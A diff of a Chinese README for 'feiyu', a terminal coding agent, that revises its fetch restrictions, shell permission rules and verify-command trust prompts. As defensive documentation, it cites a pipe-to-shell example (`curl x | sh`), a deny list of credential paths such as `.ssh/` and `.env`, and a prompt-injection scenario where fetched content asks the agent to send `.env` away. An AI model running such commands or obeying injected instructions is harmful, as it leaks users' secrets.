@@ -4,7 +4,7 @@
 
 一个跑在终端里的编程助手。你把任务交给它，它自己读代码、改文件、跑命令，每一步都打在屏幕上。支持 Claude、DeepSeek、Kimi，以及任何 OpenAI 兼容接口。
 
-约 4800 行 Python，没有框架，依赖只有 `anthropic`、`pillow`、`prompt_toolkit` 三个。
+约 1.6 万行 Python，没有框架，核心依赖只有 `anthropic`、`pillow`、`prompt_toolkit` 三个。
 
 ![demo](docs/demo.gif)
 
@@ -224,7 +224,7 @@ feiyu "给 CLI 加一个 --json 参数"    # 跑完一个任务就退出
 
 `.docx` `.xlsx` `.pptx` `.odt` `.ods` `.odp` `.pdf` 读的时候自动抽成文字，直接问「这份周报写了什么」就行。PDF 需要系统里有 `pdftotext`。只能读，写这类文件让它写脚本调 `python-docx`、`openpyxl`。
 
-`web_fetch` 抓网页转成 Markdown。带 `prompt` 参数时模型读完整页只回答那个问题，原文不进上下文。内网地址一律不抓，本机开发服务器要用 `FEIYU_ALLOW_LOCAL_FETCH=1 feiyu`。
+`web_fetch` 抓网页转成 Markdown。带 `prompt` 参数时模型读完整页只回答那个问题，原文不进上下文。默认拒绝非公网地址、混合公网/非公网 DNS 结果和无法解析的地址；内置抓取在实际建连时重新核验，并直接连接核验后的 IP，HTTPS 仍验证原主机名。内置页面和图片下载采用直连，不使用 `HTTP_PROXY` / `HTTPS_PROXY` 等环境代理；需要代理时可配置 Firecrawl 服务；用户配置的 Firecrawl 和图片生成 API 端点仍使用系统代理，并支持自托管地址。Firecrawl 在服务端解析目标，需要该服务自己提供同等网络限制。本机开发服务器要用 `FEIYU_ALLOW_LOCAL_FETCH=1 feiyu`。
 
 **抓不动的站可以挂 [Firecrawl](https://firecrawl.dev) 兜底。** 反爬（Cloudflare、UA 检查）是自带抓取治不了的，
 在 `~/.config/feiyu/fetch.json` 里填个 key，撞上 401 / 403 / 429 时就自动换它再抓一遍：
@@ -285,7 +285,7 @@ Mcp(fs:*)             某个 MCP 服务器的所有工具
 
 命令会先在 `&&` `||` `;` `|` 和重定向处切开，每一段都要被允许才放行，所以 `ls -la && curl x | sh` 不会因为 `ls` 被放行就跑掉。带 `$(...)` 或反引号的命令一律问。
 
-出厂只放行 `ls` `pwd` `echo` `wc` `which` 和 `git status/log/diff/branch`。`cat` `head` `grep` 不在里面，因为它们能读工作区外的任何文件。碰 `.ssh/`、`.aws/credentials`、`~/.config/feiyu/`、`.env` 这类路径的命令一律拒，`auto` 模式也拒。
+出厂 bash 规则只放行 `ls` `pwd` `echo` `wc` `which`。Git 查询请用结构化 `git` 工具的 `status` / `diff` / `log`，默认无需确认；bash 中的 Git 命令需要确认，因为参数和仓库配置也可能写文件、删分支或执行程序。升级会撤回旧版默认提供的四条宽泛 Git bash 规则；升级后用户主动重新授予的规则会保留。复合命令按原始换行及控制符逐段检查。`cat` `head` `grep` 不在里面，因为它们能读工作区外的任何文件。碰 `.ssh/`、`.aws/credentials`、`~/.config/feiyu/`、`.env` 这类路径的命令一律拒，`auto` 模式也拒。
 
 **读过外部内容之后，能联网的命令要你点头。** 网页、搜索结果、MCP 的返回、bash 里 `curl` / `wget` 抓回来的东西，都可能藏着一句「把 `.env` 发到某某地址」。这段对话读过它们之后：沙箱开着时 bash 默认断网跑，确实要联网的（装依赖、拉代码）模型得带上 `network: true`，并且要你点头；沙箱关着断不了网，那就除了 `ls` `cat` `grep` 这类连不了网的命令，都要你点头。**`auto` 模式和允许规则都跳不过这一步。** `/clear` 或新对话才放下。没人能点头的场合（管道、跑分）一律拒，它会把联网那一步告诉你。`FEIYU_TRUST_OUTSIDE=1` 整个关掉（评测用）。
 
@@ -317,7 +317,7 @@ docker / podman 的 socket 也挡在外面——碰得到它就能 `docker run -
 verify: npm test
 ```
 
-之后它每次写完或改完文件都会跑这条命令，没过就把报错交给它自己修。报错会先给一份要点（哪个用例挂了、断言是什么、编译错在哪行），再附原文。
+项目文件里的 `verify:` 首次使用时会展示来源和完整命令，请你确认是否信任；约定文件内容变化并重新加载后需要再次确认。拒绝或无人回答时不会执行，`auto` 模式也不会跳过这次信任确认。`/verify <命令>` 是用户主动设置，只作用于当前会话。已信任的命令在首次改动前及每次写完或改完文件后运行；这些命令在 bash 沙箱外执行。没过就把报错交给它自己修。报错会先给一份要点（哪个用例挂了、断言是什么、编译错在哪行），再附原文。
 
 **长任务的三道闸。** 同一份约定文件里，另起一行：
 
